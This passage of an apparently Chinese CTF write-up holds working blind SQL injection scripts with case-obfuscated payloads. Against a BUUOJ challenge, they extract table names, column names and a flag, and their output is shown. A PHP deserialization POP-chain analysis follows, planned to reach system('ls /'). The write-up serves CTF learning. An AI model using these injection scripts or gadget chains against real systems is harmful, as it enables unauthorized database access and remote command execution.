class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><span class="hljs-comment"># table_len存储每张表的长度</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = []<br><span class="hljs-comment"># index存储现在处理的是第index+1张表</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 由于获取的是所有表名总字符串，所以只要遍历一次即可</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># n表示当前处理的表所处理的是第n个字符</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((sElect(GROUP_CONCAT(TABLE_NAME))frOm(infOrmation_schema.tables)wHere(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload2)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 存储该表的表名</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># 打印该表的表名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;张表的名字为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># 继续下一个表</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">第1张表的名字为grades,here_is_flag<br>[&#x27;grades,here_is_flag           &#x27;]<br></code></pre></td></tr></table></figure><p>爆表的字段:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_num存储每张表每个字段所对应的长度</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;here_is_flag第1字段的长度&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = [<span class="hljs-string">&#x27;here_is_flag&#x27;</span>]<br><span class="hljs-comment"># col_count存储每张表的字段数</span><br><span class="hljs-comment"># 将所有字段合在一起输出就是只有一个字段</span><br>col_count = &#123;<span class="hljs-string">&#x27;here_is_flag&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_name存储每张表的字段的名字</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先对表进行遍历,只有表F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># 当前表的名字:table_name[table_index]</span><br>    <span class="hljs-comment"># col_num存储当前表的字段数</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 对当前表的字段进行遍历，获取全部字段名，所以只有一个字段</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_key存储当前表当前字段的key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;第&#123;&#125;字段的长度&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_len存储当前字段的长度</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># 遍历当前字段</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># name存储当前字段的名称</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>            <span class="hljs-comment"># 从可打印字符开始</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 对第n个字符进行判断</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>                <span class="hljs-comment"># payload1:用于普通盲注</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((selEct(GROUP_CONCAT(COLUMN_NAME))frOm(infOrmation_schema.COLUMNS)wHere(TABLE_NAME=&#x27;here_is_flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.05</span>)<br>                <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>                true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># 返回true界面 </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 返回flase界面</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># 继续下一个字符</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 存储当前字段的名称:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;的第&#123;&#125;个字段的名字&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># 继续下一个字段</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一张表</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">here_is_flag的第1个字段的名字:flag<br>&#123;&#x27;here_is_flag的第1个字段的名字&#x27;: &#x27;flag                                              &#x27;&#125;<br></code></pre></td></tr></table></figure><p>爆字段的值:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://29b31bd5-9259-4782-a9da-e797bb66785d.node4.buuoj.cn:81/?id=&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;ctf&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;here_is_flag&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;TMP0919&#x27;anD(asCii(suBstr((seLEct(Group_cOncAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;) -- &#x27;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload3)</span><br>            <span class="hljs-comment"># print()</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.05</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;Physics&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2023-11-3-newstar-3/image-20231010215536171.png" alt="image-20231010215536171"></p><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">//反序列化自动调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在字符串比较可以调用__toString()函数=&gt;$this-&gt;name=new Then()</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在类调用，可以用于启动__invoke()函数</span><br>        <span class="hljs-comment">//$this-&gt;func=new Super()</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在可以指定类的函数end()函数调用</span><br>        <span class="hljs-comment">//$this-&gt;obj=new CTF()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//getStr为Handle类的不存在函数所以可以用于调用__call</span><br>        <span class="hljs-comment">//$this-&gt;obj=new Handle()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在变量删除函数可以调用魔术方法__unset</span><br>        <span class="hljs-comment">//$this-&gt;handle-&gt;log=$WhiteGod-&gt;$func</span><br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//存在危险函数注入=&gt;$this-&gt;func=system,$this-&gt;var=ls /</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <br><br></code></pre></td></tr></table></figure><p>pop链构造:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.WhiteGod-&gt;__unset<br>2.CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>3.Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>4.Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>5.Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br>6.Begin-&gt;__destruct=&gt;Then-&gt;__toString=&gt;Super-&gt;__invoke=&gt;Handle-&gt;__call=&gt;CTF-&gt;end=&gt;WhiteGod-&gt;__unset<br></code></pre></td></tr></table></figure><p>魔术函数介绍:</p><p>__unset（）魔术方法:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">__unset()魔术方法在使用unset()函数删除一个对象的属性时会自动调用。当一个对象的属性被unset时，如果该对象定义了__unset()方法，那么该方法会被自动调用。<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 